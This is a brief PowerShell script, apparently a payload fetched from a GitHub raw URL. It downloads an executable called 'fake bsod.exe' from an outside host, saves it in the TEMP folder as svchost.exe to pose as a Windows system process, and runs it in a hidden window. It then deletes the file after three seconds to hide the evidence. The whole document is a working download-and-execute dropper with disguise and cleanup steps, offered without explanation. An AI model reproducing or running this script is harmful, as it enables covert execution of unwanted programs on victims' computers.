# https://raw.githubusercontent.com/border002/main/raw/main/payload.ps1
$wc = New-Object Net.WebClient
$url = "https://github.com/border002/main/raw/main/fake%20bsod.exe"
$path = "$env:TEMP\svchost.exe"
$wc.DownloadFile($url, $path)
Start-Process $path -WindowStyle Hidden
Start-Sleep 3
Remove-Item $path -Force
